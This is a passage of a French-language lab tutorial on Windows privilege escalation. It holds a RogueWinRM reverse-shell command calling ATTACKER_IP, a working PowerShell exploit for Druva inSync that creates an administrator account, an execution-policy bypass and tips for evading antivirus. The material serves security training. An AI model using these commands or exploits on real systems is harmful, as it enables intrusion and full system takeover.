L'exploit RogueWinRM est possible parce que chaque fois qu'un utilisateur (y compris les utilisateurs non privilégiés) démarre le **service BITS** dans Windows, il crée automatiquement une connexion au port **5985** en utilisant les privilèges SYSTEM. Le port 5985 est généralement utilisé pour le service WinRM, qui est simplement un port qui expose une console Powershell à utiliser à distance via le réseau. **C'est un peu comme SSH, mais avec Powershell**.

Si, pour une raison quelconque, le service WinRM ne fonctionne pas sur le serveur victime, un attaquant peut démarrer un faux service WinRM sur le port 5985 et attraper la tentative d'authentification effectuée par le service BITS lors du démarrage. Si l'attaquant dispose des privilèges SeImpersonate, il peut exécuter n'importe quelle commande au nom de l'utilisateur qui se connecte, c'est-à-dire SYSTEM.

Avant d'exécuter l'exploit, nous allons démarrer un listener netcat pour recevoir un reverse shell sur la machine de notre attaquant :

```bash
nc -lvp 4442
```

Ensuite, utilisez notre shell web pour déclencher l'exploit RogueWinRM à l'aide de la commande suivante :

```powershell
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

Note : L'exploit peut prendre jusqu'à 2 minutes pour fonctionner, il se peut donc que votre navigateur ne réponde pas pendant un certain temps. Cela se produit si vous exécutez l'exploit plusieurs fois, car il doit attendre que le service BITS s'arrête avant de le relancer. Le service BITS s'arrêtera automatiquement après 2 minutes de démarrage.

Le paramètre `-p` spécifie l'exécutable à exécuter par l'exploit, qui est `nc64.exe` dans ce cas. Le paramètre `-a` est utilisé pour passer des arguments à l'exécutable. Comme nous voulons que nc64 établisse un shell inversé contre notre machine attaquante, les arguments à passer à netcat seront `-e cmd.exe ATTACKER_IP 4442`.

Si tout a été correctement configuré, vous devriez obtenir un shell avec les privilèges SYSTEM.


## Logiciels non-patchés / vulnérables

Les logiciels installés sur le système cible peuvent présenter diverses possibilités d'escalade des privilèges. Comme pour les pilotes, les organisations et les utilisateurs peuvent ne pas les mettre à jour aussi souvent qu'ils mettent à jour le système d'exploitation. Vous pouvez utiliser l'outil `wmic` pour dresser la liste des logiciels installés sur le système cible et de leurs versions. La commande ci-dessous va déverser les informations qu'elle peut recueillir sur les logiciels installés (elle peut prendre environ une minute pour se terminer) :

```powershell	
wmic product get name,version,vendor
```
N'oubliez pas que la commande `wmic product` ne renvoie pas nécessairement tous les programmes installés. En fonction de la manière dont certains programmes ont été installés, il se peut qu'ils ne soient pas répertoriés ici. Il est toujours utile de vérifier les raccourcis du bureau, les services disponibles ou, d'une manière générale, toute trace indiquant l'existence d'un logiciel supplémentaire susceptible d'être vulnérable.

Une fois que nous avons recueilli les informations sur la version du produit, nous pouvons toujours rechercher des exploits existants sur les logiciels installés en ligne sur des sites tels que exploit-db, packet storm ou le bon vieux Google, parmi beaucoup d'autres.

### Cas d'étude : Druva inSync 6.6.6.3

Le serveur cible utilise Druva inSync 6.6.3, qui est vulnérable à l'escalade de privilèges comme rapporté par [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). La vulnérabilité résulte d'un mauvais correctif appliqué sur une autre vulnérabilité rapportée initialement pour la version 6.5.0 par [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).

Le logiciel est vulnérable parce qu'il exécute un serveur RPC (Remote Procedure Call) sur le port 6064 avec les privilèges SYSTEM, accessible uniquement depuis localhost. Si vous n'êtes pas familier avec RPC, il s'agit simplement d'un mécanisme qui permet à un processus donné d'exposer des fonctions (appelées procédures dans le jargon RPC) sur le réseau afin que d'autres machines puissent les appeler à distance.

Dans le cas de Druva inSync, l'une des procédures exposées (spécifiquement la procédure numéro 5) sur le port 6064 permettait à n'importe qui de demander l'exécution de n'importe quelle commande. Comme le serveur RPC fonctionne en tant que SYSTEM, toute commande est exécutée avec les privilèges SYSTEM.

La vulnérabilité originale signalée dans les versions 6.5.0 et antérieures permettait d'exécuter n'importe quelle commande sans restriction. L'idée originale derrière cette fonctionnalité était d'exécuter à distance certains binaires spécifiques fournis avec inSync, plutôt que n'importe quelle commande. Cependant, aucune vérification n'a été faite pour s'en assurer.

Un correctif a été publié, dans lequel il a été décidé de vérifier que la commande exécutée commençait par la chaîne `C:\ProgramData\Druva\inSync4\`, où les binaires autorisés étaient censés se trouver. Mais cela s'est avéré insuffisant, car il suffit d'effectuer une attaque par traversée de chemin pour contourner ce type de contrôle. Supposons que vous vouliez exécuter `C:\Windows\System32\cmd.exe`, qui ne se trouve pas dans le chemin autorisé ; vous pourriez simplement demander au serveur d'exécuter `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` et cela contournerait le contrôle avec succès.

Pour mettre en place un exploit fonctionnel, nous devons comprendre comment communiquer avec le port 6064. Heureusement pour nous, le protocole utilisé est simple, et les paquets à envoyer sont décrits dans le diagramme suivant :


Le premier paquet est simplement un paquet hello qui contient une chaîne de caractères fixe. Le deuxième paquet indique que nous voulons exécuter la procédure numéro 5, car il s'agit de la procédure vulnérable qui exécutera n'importe quelle commande pour nous. Les deux derniers paquets sont utilisés pour envoyer la longueur de la commande et la chaîne de commande à exécuter, respectivement.

Initialement publié par Matteo Malvica ici, l'exploit suivant peut être utilisé dans votre machine cible pour élever les privilèges. Voici le code de l'exploit original :
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Notez que la charge utile par défaut de l'exploit, spécifiée dans la variable $cmd. Cela créera l'utilisateur pwnd avec un mot de passe SimplePass123 et l'ajoutera au groupe des administrateurs. Si l'exploit a réussi, vous devriez pouvoir exécuter la commande suivante pour vérifier que l'utilisateur pwnd existe et qu'il fait partie du groupe des administrateurs :

```cmd
net user pwnd
```

## Outils utiles 

Il existe plusieurs scripts permettant de procéder à l'énumération du système de manière similaire à celle décrite dans la tâche précédente. Ces outils peuvent raccourcir la durée du processus d'énumération et découvrir différents vecteurs potentiels d'escalade des privilèges. Cependant, n'oubliez pas que les outils automatisés peuvent parfois manquer une escalade de privilèges.

Vous trouverez ci-dessous quelques outils couramment utilisés pour identifier les vecteurs d'élévation de privilèges. N'hésitez pas à les utiliser sur les machines présentes dans cette salle et à vérifier si les résultats correspondent aux vecteurs d'attaque évoqués.

### WinPEAS

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) est un script développé pour énumérer le système cible afin de découvrir les chemins d'escalade des privilèges. Vous pouvez trouver plus d'informations sur WinPEAS et télécharger l'exécutable précompilé ou un script .bat. WinPEAS exécutera des commandes similaires à celles énumérées précédemment et imprimera leur sortie. La sortie de winPEAS peut être longue et parfois difficile à lire. C'est pourquoi il serait bon de toujours rediriger la sortie vers un fichier, comme indiqué ci-dessous :

```cmd
C:\> winpeas.exe > outputfile.tx
```
### PrivescCheck

[PrivescCheck](https://github.com/itm4n/PrivescCheck) est un script PowerShell qui recherche une escalade commune des privilèges sur le système cible. Il constitue une alternative à WinPEAS sans nécessiter l'exécution d'un fichier binaire.

Rappel : Pour exécuter PrivescCheck sur le système cible, vous devrez peut-être contourner les restrictions de la politique d'exécution. Pour ce faire, vous pouvez utiliser la cmdlet `Set-ExecutionPolicy` comme indiqué ci-dessous.

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

### WES-NG: Windows Exploit Suggester - Next Generation

Certains scripts suggérant des exploits (par exemple winPEAS) nécessitent que vous les téléchargiez sur le système cible et que vous les y exécutiez. Cela peut amener les logiciels antivirus à les détecter et à les supprimer. Pour éviter de faire un bruit inutile qui pourrait attirer l'attention, vous pouvez préférer utiliser [WES-NG](https://github.com/bitsadmin/wesng), qui s'exécutera sur votre machine d'attaque (par exemple Kali)

Une fois installé, et avant de l'utiliser, tapez la commande `wes.py --update` pour mettre à jour la base de données. Le script se référera à la base de données qu'il crée pour vérifier s'il manque des correctifs qui peuvent entraîner une vulnérabilité que vous pouvez utiliser pour élever vos privilèges sur le système cible.

Pour utiliser le script, vous devez exécuter la commande `systeminfo` sur le système cible. N'oubliez pas de diriger la sortie vers un fichier .txt que vous devrez déplacer sur votre machine d'attaque.

Une fois cela fait, wes.py peut être exécuté comme suit :

```bash
user@kali$ wes.py systeminfo.txt
```

### Metasploit

Si vous disposez déjà d'un shell Meterpreter sur le système cible, vous pouvez utiliser le module `multi/recon/local_exploit_suggester` pour lister les vulnérabilités qui peuvent affecter le système cible et vous permettre d'élever vos privilèges sur le système cible.

## Ressources intéressantes

* [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
* [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
* [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
* [Decoder's Blog](https://decoder.cloud/)
* [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
* [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)